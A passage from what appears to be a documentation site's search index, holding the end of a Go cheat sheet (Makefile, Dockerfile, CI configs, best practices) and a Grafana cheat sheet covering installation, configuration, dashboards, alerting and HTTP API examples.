golangci-lint run\n\nfmt:\n    go fmt ./...\n\nvet:\n    go vet ./...\n\ntidy:\n    go mod tidy\n\nrun:\n    go run ./cmd/myapp\n\ndocker-build:\n    docker build -t myapp:latest .\n\nall: fmt vet lint test build\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#docker","title":"Docker","text":""},{"location":"cheat-sheet/golang/golang/#dockerfile-multi-stage","title":"Dockerfile (Multi-stage)","text":"<pre><code># Build stage\nFROM golang:1.24-alpine AS builder\n\nWORKDIR /app\n\n# Copy go mod files\nCOPY go.mod go.sum ./\nRUN go mod download\n\n# Copy source code\nCOPY . .\n\n# Build\nRUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o main ./cmd/myapp\n\n# Final stage\nFROM alpine:latest\n\nRUN apk --no-cache add ca-certificates\n\nWORKDIR /root/\n\nCOPY --from=builder /app/main .\n\nEXPOSE 8080\n\nCMD [\"./main\"]\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#dockerignore","title":".dockerignore","text":"<pre><code>.git\n.gitignore\nREADME.md\nMakefile\n*.md\nbin/\nvendor/\n.env\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#cicd-examples","title":"CI/CD Examples","text":""},{"location":"cheat-sheet/golang/golang/#github-actions","title":"GitHub Actions","text":"<p>.github/workflows/go.yml: <pre><code>name: Go CI\n\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v4\n\n    - name: Set up Go\n      uses: actions/setup-go@v5\n      with:\n        go-version: '1.24'\n\n    - name: Build\n      run: go build -v ./...\n\n    - name: Test\n      run: go test -v -race -coverprofile=coverage.out ./...\n\n    - name: Upload coverage\n      uses: codecov/codecov-action@v3\n      with:\n        files: ./coverage.out\n\n    - name: Vet\n      run: go vet ./...\n\n    - name: staticcheck\n      uses: dominikh/staticcheck-action@v1\n      with:\n        version: \"latest\"\n</code></pre></p>"},{"location":"cheat-sheet/golang/golang/#gitlab-ci","title":"GitLab CI","text":"<p>.gitlab-ci.yml: <pre><code>image: golang:1.24\n\nstages:\n  - test\n  - build\n\nbefore_script:\n  - go mod download\n\ntest:\n  stage: test\n  script:\n    - go fmt ./...\n    - go vet ./...\n    - go test -race -coverprofile=coverage.out ./...\n    - go tool cover -func=coverage.out\n\nbuild:\n  stage: build\n  script:\n    - go build -o myapp ./cmd/myapp\n  artifacts:\n    paths:\n      - myapp\n</code></pre></p>"},{"location":"cheat-sheet/golang/golang/#go-tool-dependencies-go-124","title":"Go Tool Dependencies (Go 1.24+)","text":""},{"location":"cheat-sheet/golang/golang/#manage-tool-dependencies","title":"Manage Tool Dependencies","text":"<p>go.mod: <pre><code>module example.com/myproject\n\ngo 1.24\n\nrequire (\n    github.com/gin-gonic/gin v1.9.1\n)\n\ntool (\n    golang.org/x/tools/cmd/goimports\n    honnef.co/go/tools/cmd/staticcheck\n)\n</code></pre></p> <p>Run tools: <pre><code># Run tool from go.mod\ngo tool goimports -w .\ngo tool staticcheck ./...\n</code></pre></p>"},{"location":"cheat-sheet/golang/golang/#best-practices","title":"Best Practices","text":""},{"location":"cheat-sheet/golang/golang/#module-management","title":"Module Management","text":"<ul> <li>Always run <code>go mod tidy</code> before committing</li> <li>Commit both <code>go.mod</code> and <code>go.sum</code></li> <li>Use <code>go mod vendor</code> for reproducible builds</li> <li>Pin tool versions in <code>go.mod</code> (Go 1.24+)</li> </ul>"},{"location":"cheat-sheet/golang/golang/#testing_1","title":"Testing","text":"<ul> <li>Write table-driven tests</li> <li>Use subtests for better organization</li> <li>Aim for &gt;80% code coverage</li> <li>Use <code>-race</code> flag regularly</li> <li>Write benchmarks for performance-critical code</li> </ul>"},{"location":"cheat-sheet/golang/golang/#code-quality","title":"Code Quality","text":"<ul> <li>Run <code>go fmt</code> before committing</li> <li>Use <code>go vet</code> to catch common mistakes</li> <li>Use static analyzers (<code>staticcheck</code>, <code>golangci-lint</code>)</li> <li>Keep functions small and focused</li> <li>Use meaningful names</li> </ul>"},{"location":"cheat-sheet/golang/golang/#build-deploy","title":"Build &amp; Deploy","text":"<ul> <li>Use multi-stage Docker builds</li> <li>Build with <code>-ldflags=\"-s -w\"</code> for smaller binaries</li> <li>Cross-compile for target platforms</li> <li>Use build tags for environment-specific code</li> <li>Version your releases</li> </ul>"},{"location":"cheat-sheet/golang/golang/#performance","title":"Performance","text":"<ul> <li>Profile before optimizing</li> <li>Use <code>pprof</code> for CPU and memory profiling</li> <li>Use <code>-benchmem</code> to track allocations</li> <li>Avoid premature optimization</li> <li>Use sync.Pool for frequent allocations</li> </ul>"},{"location":"cheat-sheet/golang/golang/#resources","title":"Resources","text":"<ul> <li>Official documentation: https://go.dev/doc/</li> <li>Go modules reference: https://go.dev/ref/mod</li> <li>Effective Go: https://go.dev/doc/effective_go</li> <li>Go wiki: https://go.dev/wiki/</li> <li>Standard library: https://pkg.go.dev/std</li> <li>Go playground: https://go.dev/play/</li> <li>Go by Example: https://gobyexample.com/</li> </ul>"},{"location":"cheat-sheet/grafana/grafana/","title":"Grafana Cheat Sheet","text":""},{"location":"cheat-sheet/grafana/grafana/#overview","title":"Overview","text":"<p>Grafana is an open-source observability platform for visualizing metrics, logs, and traces from multiple data sources.</p> <p>Key Features: - Multi-source data visualization - Interactive dashboards - Alerting and notifications - Support for 150+ data sources - Template variables for dynamic dashboards - Panel library and sharing</p>"},{"location":"cheat-sheet/grafana/grafana/#installation","title":"Installation","text":""},{"location":"cheat-sheet/grafana/grafana/#docker","title":"Docker","text":"<pre><code>docker run -d -p 3000:3000 --name=grafana grafana/grafana\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#docker-with-persistent-storage","title":"Docker with persistent storage","text":"<pre><code>docker run -d -p 3000:3000 \\\n  --name=grafana \\\n  -v grafana-storage:/var/lib/grafana \\\n  grafana/grafana\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#docker-compose","title":"Docker Compose","text":"<pre><code>version: '3'\nservices:\n  grafana:\n    image: grafana/grafana:latest\n    ports:\n      - \"3000:3000\"\n    volumes:\n      - grafana-data:/var/lib/grafana\n    environment:\n      - GF_SECURITY_ADMIN_PASSWORD=admin\n      - GF_USERS_ALLOW_SIGN_UP=false\n\nvolumes:\n  grafana-data:\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#kubernetes-with-helm","title":"Kubernetes (with Helm)","text":"<pre><code>helm repo add grafana https://grafana.github.io/helm-charts\nhelm install grafana grafana/grafana\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#linux-debianubuntu","title":"Linux (Debian/Ubuntu)","text":"<pre><code>sudo apt-get install -y software-properties-common\nsudo add-apt-repository \"deb https://packages.grafana.com/oss/deb stable main\"\nwget -q -O - https://packages.grafana.com/gpg.key | sudo apt-key add -\nsudo apt-get update\nsudo apt-get install grafana\nsudo systemctl start grafana-server\nsudo systemctl enable grafana-server\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#default-credentials","title":"Default Credentials","text":"<ul> <li>URL: http://localhost:3000</li> <li>Username: <code>admin</code></li> <li>Password: <code>admin</code> (change on first login)</li> </ul>"},{"location":"cheat-sheet/grafana/grafana/#configuration","title":"Configuration","text":""},{"location":"cheat-sheet/grafana/grafana/#main-configuration-file","title":"Main Configuration File","text":"<p>Location: <code>/etc/grafana/grafana.ini</code> (Linux) or <code>conf/defaults.ini</code></p> <pre><code>[server]\nhttp_port = 3000\ndomain = localhost\nroot_url = %(protocol)s://%(domain)s:%(http_port)s/\n\n[database]\ntype = sqlite3\npath = grafana.db\n\n[security]\nadmin_user = admin\nadmin_password = admin\n\n[users]\nallow_sign_up = false\nallow_org_create = false\n\n[auth.anonymous]\nenabled = false\n\n[smtp]\nenabled = true\nhost = smtp.gmail.com:587\nuser = your-email@gmail.com\npassword = your-password\nfrom_address = grafana@yourdomain.com\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#environment-variables","title":"Environment Variables","text":"<pre><code># Set admin password\nGF_SECURITY_ADMIN_PASSWORD=mypassword\n\n# Disable anonymous access\nGF_AUTH_ANONYMOUS_ENABLED=false\n\n# Set SMTP\nGF_SMTP_ENABLED=true\nGF_SMTP_HOST=smtp.gmail.com:587\nGF_SMTP_USER=email@example.com\nGF_SMTP_PASSWORD=password\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#data-sources","title":"Data Sources","text":""},{"location":"cheat-sheet/grafana/grafana/#add-prometheus-data-source","title":"Add Prometheus Data Source","text":"<p>Via UI: 1. Configuration \u2192 Data Sources \u2192 Add data source 2. Select Prometheus 3. URL: <code>http://prometheus:9090</code> 4. Click \"Save &amp; Test\"</p> <p>Via provisioning (<code>/etc/grafana/provisioning/datasources/prometheus.yml</code>): <pre><code>apiVersion: 1\n\ndatasources:\n  - name: Prometheus\n    type: prometheus\n    access: proxy\n    url: http://prometheus:9090\n    isDefault: true\n    editable: true\n</code></pre></p>"},{"location":"cheat-sheet/grafana/grafana/#add-mysql-data-source","title":"Add MySQL Data Source","text":"<pre><code>apiVersion: 1\n\ndatasources:\n  - name: MySQL\n    type: mysql\n    url: mysql-host:3306\n    database: mydb\n    user: grafana\n    secureJsonData:\n      password: 'password'\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#add-postgresql-data-source","title":"Add PostgreSQL Data Source","text":"<pre><code>apiVersion: 1\n\ndatasources:\n  - name: PostgreSQL\n    type: postgres\n    url: postgres-host:5432\n    database: mydb\n    user: grafana\n    secureJsonData:\n      password: 'password'\n    jsonData:\n      sslmode: disable\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#add-loki-data-source","title":"Add Loki Data Source","text":"<pre><code>apiVersion: 1\n\ndatasources:\n  - name: Loki\n    type: loki\n    access: proxy\n    url: http://loki:3100\n    jsonData:\n      maxLines: 1000\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#add-elasticsearch-data-source","title":"Add Elasticsearch Data Source","text":"<pre><code>apiVersion: 1\n\ndatasources:\n  - name: Elasticsearch\n    type: elasticsearch\n    access: proxy\n    url: http://elasticsearch:9200\n    database: \"[logs-]YYYY.MM.DD\"\n    jsonData:\n      esVersion: \"7.10.0\"\n      timeField: \"@timestamp\"\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#dashboards","title":"Dashboards","text":""},{"location":"cheat-sheet/grafana/grafana/#create-dashboard-via-ui","title":"Create Dashboard via UI","text":"<ol> <li>Click \"+\" \u2192 Dashboard</li> <li>Click \"Add new panel\"</li> <li>Configure query and visualization</li> <li>Click \"Apply\"</li> <li>Click \"Save dashboard\"</li> </ol>"},{"location":"cheat-sheet/grafana/grafana/#import-dashboard","title":"Import Dashboard","text":"<ol> <li>Click \"+\" \u2192 Import</li> <li>Enter dashboard ID or JSON</li> <li>Select data source</li> <li>Click \"Import\"</li> </ol> <p>Popular Dashboard IDs: - Node Exporter Full: <code>1860</code> - Kubernetes Cluster Monitoring: <code>7249</code> - Docker Dashboard: <code>893</code> - MySQL Overview: <code>7362</code> - NGINX: <code>12708</code></p>"},{"location":"cheat-sheet/grafana/grafana/#export-dashboard","title":"Export Dashboard","text":"<ol> <li>Dashboard Settings (gear icon) \u2192 JSON Model</li> <li>Copy JSON or click \"Save to file\"</li> </ol>"},{"location":"cheat-sheet/grafana/grafana/#dashboard-provisioning","title":"Dashboard Provisioning","text":"<p>Create <code>/etc/grafana/provisioning/dashboards/dashboard.yml</code>:</p> <pre><code>apiVersion: 1\n\nproviders:\n  - name: 'Default'\n    orgId: 1\n    folder: ''\n    type: file\n    disableDeletion: false\n    updateIntervalSeconds: 10\n    options:\n      path: /var/lib/grafana/dashboards\n</code></pre> <p>Place dashboard JSON files in <code>/var/lib/grafana/dashboards/</code></p>"},{"location":"cheat-sheet/grafana/grafana/#dashboard-json-example","title":"Dashboard JSON Example","text":"<pre><code>{\n  \"dashboard\": {\n    \"title\": \"My Dashboard\",\n    \"panels\": [\n      {\n        \"id\": 1,\n        \"type\": \"graph\",\n        \"title\": \"CPU Usage\",\n        \"targets\": [\n          {\n            \"expr\": \"100 - (avg(rate(node_cpu_seconds_total{mode=\\\"idle\\\"}[5m])) * 100)\",\n            \"refId\": \"A\"\n          }\n        ]\n      }\n    ],\n    \"time\": {\n      \"from\": \"now-6h\",\n      \"to\": \"now\"\n    },\n    \"refresh\": \"5s\"\n  }\n}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#panels-visualizations","title":"Panels &amp; Visualizations","text":""},{"location":"cheat-sheet/grafana/grafana/#panel-types","title":"Panel Types","text":""},{"location":"cheat-sheet/grafana/grafana/#time-series-graph","title":"Time Series (Graph)","text":"<p>Best for: Metrics over time</p> <pre><code>{\n  \"type\": \"timeseries\",\n  \"targets\": [\n    {\n      \"expr\": \"rate(http_requests_total[5m])\"\n    }\n  ]\n}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#stat","title":"Stat","text":"<p>Best for: Single numeric value</p> <pre><code>{\n  \"type\": \"stat\",\n  \"targets\": [\n    {\n      \"expr\": \"sum(up)\"\n    }\n  ],\n  \"options\": {\n    \"graphMode\": \"area\",\n    \"colorMode\": \"value\"\n  }\n}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#gauge","title":"Gauge","text":"<p>Best for: Percentage or threshold visualization</p> <pre><code>{\n  \"type\": \"gauge\",\n  \"targets\": [\n    {\n      \"expr\": \"(1 - (node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes)) * 100\"\n    }\n  ],\n  \"fieldConfig\": {\n    \"defaults\": {\n      \"max\": 100,\n      \"min\": 0,\n      \"thresholds\": {\n        \"steps\": [\n          {\"color\": \"green\", \"value\": 0},\n          {\"color\": \"yellow\", \"value\": 70},\n          {\"color\": \"red\", \"value\": 90}\n        ]\n      }\n    }\n  }\n}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#bar-chart","title":"Bar Chart","text":"<p>Best for: Comparing values across categories</p> <pre><code>{\n  \"type\": \"barchart\",\n  \"targets\": [\n    {\n      \"expr\": \"sum(http_requests_total) by (method)\"\n    }\n  ]\n}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#table","title":"Table","text":"<p>Best for: Tabular data display</p> <pre><code>{\n  \"type\": \"table\",\n  \"targets\": [\n    {\n      \"expr\": \"up\",\n      \"format\": \"table\"\n    }\n  ]\n}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#heatmap","title":"Heatmap","text":"<p>Best for: Distribution over time</p> <pre><code>{\n  \"type\": \"heatmap\",\n  \"targets\": [\n    {\n      \"expr\": \"rate(http_request_duration_seconds_bucket[5m])\"\n    }\n  ]\n}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#pie-chart","title":"Pie Chart","text":"<p>Best for: Part-to-whole relationships</p> <pre><code>{\n  \"type\": \"piechart\",\n  \"targets\": [\n    {\n      \"expr\": \"sum(http_requests_total) by (status_code)\"\n    }\n  ]\n}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#logs-panel","title":"Logs Panel","text":"<p>Best for: Log entries from Loki</p> <pre><code>{\n  \"type\": \"logs\",\n  \"datasource\": \"Loki\",\n  \"targets\": [\n    {\n      \"expr\": \"{job=\\\"varlogs\\\"}\"\n    }\n  ]\n}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#panel-options","title":"Panel Options","text":""},{"location":"cheat-sheet/grafana/grafana/#thresholds","title":"Thresholds","text":"<pre><code>{\n  \"thresholds\": {\n    \"mode\": \"absolute\",\n    \"steps\": [\n      {\"value\": 0, \"color\": \"green\"},\n      {\"value\": 80, \"color\": \"yellow\"},\n      {\"value\": 100, \"color\": \"red\"}\n    ]\n  }\n}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#value-mappings","title":"Value Mappings","text":"<pre><code>{\n  \"mappings\": [\n    {\n      \"type\": \"value\",\n      \"options\": {\n        \"0\": {\"text\": \"Down\", \"color\": \"red\"},\n        \"1\": {\"text\": \"Up\", \"color\": \"green\"}\n      }\n    }\n  ]\n}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#overrides","title":"Overrides","text":"<pre><code>{\n  \"overrides\": [\n    {\n      \"matcher\": {\"id\": \"byName\", \"options\": \"Series 1\"},\n      \"properties\": [\n        {\"id\": \"color\", \"value\": {\"mode\": \"fixed\", \"fixedColor\": \"blue\"}}\n      ]\n    }\n  ]\n}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#variables","title":"Variables","text":""},{"location":"cheat-sheet/grafana/grafana/#query-variable","title":"Query Variable","text":"<pre><code>Name: instance\nType: Query\nData source: Prometheus\nQuery: label_values(up, instance)\nRefresh: On Dashboard Load\n</code></pre> <p>Usage in query: <pre><code>up{instance=\"$instance\"}\n</code></pre></p>"},{"location":"cheat-sheet/grafana/grafana/#custom-variable","title":"Custom Variable","text":"<pre><code>Name: environment\nType: Custom\nValues: production,staging,development\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#interval-variable","title":"Interval Variable","text":"<pre><code>Name: interval\nType: Interval\nValues: 1m,5m,10m,30m,1h\nAuto: enabled\n</code></pre> <p>Usage in query: <pre><code>rate(http_requests_total[$interval])\n</code></pre></p>"},{"location":"cheat-sheet/grafana/grafana/#constant-variable","title":"Constant Variable","text":"<pre><code>Name: threshold\nType: Constant\nValue: 80\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#data-source-variable","title":"Data Source Variable","text":"<pre><code>Name: datasource\nType: Data source\nType: Prometheus\n</code></pre> <p>Usage: Select data source: <code>${datasource}</code></p>"},{"location":"cheat-sheet/grafana/grafana/#chained-variables","title":"Chained Variables","text":"<pre><code>Variable 1:\nName: region\nQuery: label_values(up, region)\n\nVariable 2:\nName: instance\nQuery: label_values(up{region=\"$region\"}, instance)\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#multi-value-variables","title":"Multi-value Variables","text":"<p>Enable \"Multi-value\" option to select multiple values.</p> <p>Usage in query: <pre><code>up{instance=~\"$instance\"}\n</code></pre></p>"},{"location":"cheat-sheet/grafana/grafana/#transformations","title":"Transformations","text":""},{"location":"cheat-sheet/grafana/grafana/#common-transformations","title":"Common Transformations","text":""},{"location":"cheat-sheet/grafana/grafana/#filter-by-name","title":"Filter by name","text":"<p>Filter series by name pattern.</p>"},{"location":"cheat-sheet/grafana/grafana/#rename-by-regex","title":"Rename by regex","text":"<pre><code>Regex: (.*)_total\nReplace: $1\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#organize-fields","title":"Organize fields","text":"<p>Reorder, hide, or rename fields.</p>"},{"location":"cheat-sheet/grafana/grafana/#join-by-field","title":"Join by field","text":"<p>Combine data from multiple queries.</p>"},{"location":"cheat-sheet/grafana/grafana/#add-field-from-calculation","title":"Add field from calculation","text":"<pre><code>Mode: Reduce row\nCalculation: Mean\nAlias: average\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#filter-data-by-value","title":"Filter data by value","text":"<pre><code>Match: All conditions\nCondition: temperature &gt; 30\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#group-by","title":"Group by","text":"<pre><code>Group by: hostname\nAggregation: Mean\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#transformation-example","title":"Transformation Example","text":"<pre><code>{\n  \"transformations\": [\n    {\n      \"id\": \"filterByName\",\n      \"options\": {\n        \"include\": {\n          \"pattern\": \"^temp.*\"\n        }\n      }\n    },\n    {\n      \"id\": \"organize\",\n      \"options\": {\n        \"excludeByName\": {},\n        \"indexByName\": {},\n        \"renameByName\": {\n          \"temp_celsius\": \"Temperature (\u00b0C)\"\n        }\n      }\n    }\n  ]\n}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#alerting","title":"Alerting","text":""},{"location":"cheat-sheet/grafana/grafana/#create-alert-rule","title":"Create Alert Rule","text":"<p>Via UI: 1. Panel \u2192 Alert tab 2. Create alert rule 3. Define query and conditions 4. Set evaluation interval 5. Configure notifications</p> <p>Alert Rule Example: <pre><code>apiVersion: 1\n\ngroups:\n  - orgId: 1\n    name: my-alerts\n    folder: alerts\n    interval: 1m\n    rules:\n      - uid: alert1\n        title: High CPU Usage\n        condition: A\n        data:\n          - refId: A\n            datasourceUid: prometheus-uid\n            model:\n              expr: 100 - (avg(rate(node_cpu_seconds_total{mode=\"idle\"}[5m])) * 100)\n              refId: A\n        noDataState: NoData\n        execErrState: Alerting\n        for: 5m\n        annotations:\n          description: CPU usage is above 80%\n        labels:\n          severity: warning\n</code></pre></p>"},{"location":"cheat-sheet/grafana/grafana/#notification-channels","title":"Notification Channels","text":""},{"location":"cheat-sheet/grafana/grafana/#email","title":"Email","text":"<pre><code>apiVersion: 1\n\nnotifiers:\n  - name: Email\n    type: email\n    uid: email1\n    settings:\n      addresses: admin@example.com;ops@example.com\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#slack","title":"Slack","text":"<pre><code>apiVersion: 1\n\ncontactPoints:\n  - orgId: 1\n    name: Slack\n    receivers:\n      - uid: slack1\n        type: slack\n        settings:\n          url: https://hooks.slack.com/services/YOUR/WEBHOOK/URL\n          text: |\n            {{ range .Alerts }}\n            Alert: {{ .Labels.alertname }}\n            Status: {{ .Status }}\n            {{ end }}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#pagerduty","title":"PagerDuty","text":"<pre><code>apiVersion: 1\n\ncontactPoints:\n  - orgId: 1\n    name: PagerDuty\n    receivers:\n      - uid: pd1\n        type: pagerduty\n        settings:\n          integrationKey: YOUR_INTEGRATION_KEY\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#webhook","title":"Webhook","text":"<pre><code>apiVersion: 1\n\ncontactPoints:\n  - orgId: 1\n    name: Webhook\n    receivers:\n      - uid: webhook1\n        type: webhook\n        settings:\n          url: https://api.example.com/alerts\n          httpMethod: POST\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#notification-policy","title":"Notification Policy","text":"<pre><code>apiVersion: 1\n\npolicies:\n  - orgId: 1\n    receiver: default-email\n    group_by: ['alertname', 'cluster']\n    group_wait: 30s\n    group_interval: 5m\n    repeat_interval: 4h\n    routes:\n      - receiver: slack\n        matchers:\n          - severity = critical\n      - receiver: pagerduty\n        matchers:\n          - severity = critical\n          - team = ops\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#annotations","title":"Annotations","text":""},{"location":"cheat-sheet/grafana/grafana/#create-annotation","title":"Create Annotation","text":"<pre><code>{\n  \"dashboardId\": 1,\n  \"panelId\": 1,\n  \"time\": 1609459200000,\n  \"text\": \"Deployment v2.0\",\n  \"tags\": [\"deployment\", \"release\"]\n}\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#query-annotations-from-prometheus","title":"Query Annotations from Prometheus","text":"<pre><code>Data source: Prometheus\nQuery: ALERTS{alertname=\"InstanceDown\"}\nTitle field: alertname\nText field: summary\nTags field: severity\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#api-examples","title":"API Examples","text":""},{"location":"cheat-sheet/grafana/grafana/#authentication","title":"Authentication","text":"<pre><code># API key (recommended)\ncurl -H \"Authorization: Bearer YOUR_API_KEY\" http://localhost:3000/api/...\n\n# Basic auth\ncurl -u admin:password http://localhost:3000/api/...\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#create-api-key","title":"Create API Key","text":"<pre><code>curl -X POST http://admin:admin@localhost:3000/api/auth/keys \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"name\": \"mykey\",\n    \"role\": \"Admin\"\n  }'\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#get-all-dashboards","title":"Get All Dashboards","text":"<pre><code>curl -H \"Authorization: Bearer YOUR_API_KEY\" \\\n  http://localhost:3000/api/search?type=dash-db\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#get-dashboard-by-uid","title":"Get Dashboard by UID","text":"<pre><code>curl -H \"Authorization: Bearer YOUR_API_KEY\" \\\n  http://localhost:3000/api/dashboards/uid/DASHBOARD_UID\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#createupdate-dashboard","title":"Create/Update Dashboard","text":"<pre><code>curl -X POST http://localhost:3000/api/dashboards/db \\\n  -H \"Authorization: Bearer YOUR_API_KEY\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"dashboard\": {\n      \"title\": \"My Dashboard\",\n      \"panels\": []\n    },\n    \"overwrite\": true\n  }'\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#delete-dashboard","title":"Delete Dashboard","text":"<pre><code>curl -X DELETE http://localhost:3000/api/dashboards/uid/DASHBOARD_UID \\\n  -H \"Authorization: Bearer YOUR_API_KEY\"\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#get-data-sources","title":"Get Data Sources","text":"<pre><code>curl -H \"Authorization: Bearer YOUR_API_KEY\" \\\n  http://localhost:3000/api/datasources\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#create-data-source","title":"Create Data Source","text":"<pre><code>curl -X POST http://localhost:3000/api/datasources \\\n  -H \"Authorization: Bearer YOUR_API_KEY\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"name\": \"Prometheus\",\n    \"type\": \"prometheus\",\n    \"url\": \"http://prometheus:9090\",\n    \"access\": \"proxy\",\n    \"isDefault\": true\n  }'\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#query-data-source","title":"Query Data Source","text":"<pre><code>curl -X POST http://localhost:3000/api/ds/query \\\n  -H \"Authorization: Bearer YOUR_API_KEY\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"queries\": [\n      {\n        \"datasource\": {\"type\": \"prometheus\"},\n        \"expr\": \"up\",\n        \"refId\": \"A\"\n      }\n    ],\n    \"from\": \"now-1h\",\n    \"to\": \"now\"\n  }'\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#create-organization","title":"Create Organization","text":"<pre><code>curl -X POST http://localhost:3000/api/orgs \\\n  -H \"Authorization: Bearer YOUR_API_KEY\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\": \"New Org\"}'\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#create-user","title":"Create User","text":"<pre><code>curl -X POST http://localhost:3000/api/admin/users \\\n  -H \"Authorization: Bearer YOUR_API_KEY\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"name\": \"John Doe\",\n    \"email\": \"john@example.com\",\n    \"login\": \"john\",\n    \"password\": \"password\"\n  }'\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#get-current-user","title":"Get Current User","text":"<pre><code>curl -H \"Authorization: Bearer YOUR_API_KEY\" \\\n  http://localhost:3000/api/user\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#create-snapshot","title":"Create Snapshot","text":"<pre><code>curl -X POST http://localhost:3000/api/snapshots \\\n  -H \"Authorization: Bearer YOUR_API_KEY\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"dashboard\": {...},\n    \"name\": \"My Snapshot\",\n    \"expires\": 3600\n  }'\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#provisioning","title":"Provisioning","text":""},{"location":"cheat-sheet/grafana/grafana/#directory-structure","title":"Directory Structure","text":"<pre><code>/etc/grafana/provisioning/\n\u251c\u2500\u2500 dashboards/\n\u2502   \u251c\u2500\u2500 dashboard.yml\n\u2502   \u2514\u2500\u2500 my-dashboard.json\n\u251c\u2500\u2500 datasources/\n\u2502   \u2514\u2500\u2500 datasource.yml\n\u251c\u2500\u2500 notifiers/\n\u2502   \u2514\u2500\u2500 notifier.yml\n\u2514\u2500\u2500 alerting/\n    \u251c\u2500\u2500 alert-rules.yml\n    \u2514\u2500\u2500 notification-policies.yml\n</code></pre>"},{"location":"cheat-sheet/grafana/grafana/#complete-example","title":"Complete Example","text":"<p>datasources/prometheus.yml: <pre><code>apiVersion: 1\n\ndatasources:\n  - name: Prometheus\n    type: prometheus\n    access: proxy\n    url: http://prometheus:9090\n    isDefault: true\n</code></pre></p> <p>dashboards/default.yml: <pre><code>apiVersion: 1\n\nproviders:\n  - name: 'Default'\n    orgId: 1\n    folder: ''\n    type: file\n    options:\n      path: /var/lib/grafana/dashboards\n</code></pre></p>"},{"location":"cheat-sheet/grafana/grafana/#best-practices","title":"Best Practices","text":""},{"location":"cheat-sheet/grafana/grafana/#dashboard-design","title":"Dashboard Design","text":"<ul> <li>Use consistent time ranges</li> <li>Group related panels</li> <li>Use appropriate visualizations</li> <li>Add descriptions to panels</li> <li>Use template variables for flexibility</li> <li>Keep dashboards focused (single purpose)</li> </ul>"},{"location":"cheat-sheet/grafana/grafana/#performance","title":"Performance","text":"<ul> <li>Limit time ranges for heavy queries</li> <li>Use recording rules in Prometheus</li> <li>Avoid too many panels per dashboard (&lt; 20)</li> <li>Use appropriate refresh intervals</li> <li>Cache query results when possible</li> </ul>"},{"location":"cheat-sheet/grafana/grafana/#organization","title":"Organization","text":"<ul> <li>Use folders to organize dashboards</li> <li>Tag dashboards appropriately</li> <li>Use naming conventions</li> <li>Document complex queries</li> <li>Version control dashboard JSON</li> </ul>"},{"location":"cheat-sheet/grafana/grafana/#security","title":"Security","text":"<ul> <li>Use API keys instead of passwords</li> <li>Implement role-based access control</li> <li>Enable HTTPS</li> <li>Regular backups</li> <li>Update Grafana regularly</li> </ul>"},{"location":"cheat-sheet/grafana/grafana/#alerting_1","title":"Alerting","text":"<ul> <li>Set appropriate thresholds</li> <li>Avoid alert fatigue (don't over-alert)</li> <li>Group related alerts</li> <li>Use meaningful alert names</li> <li>Include context in notifications</li> <li>Test alerts before production</li> 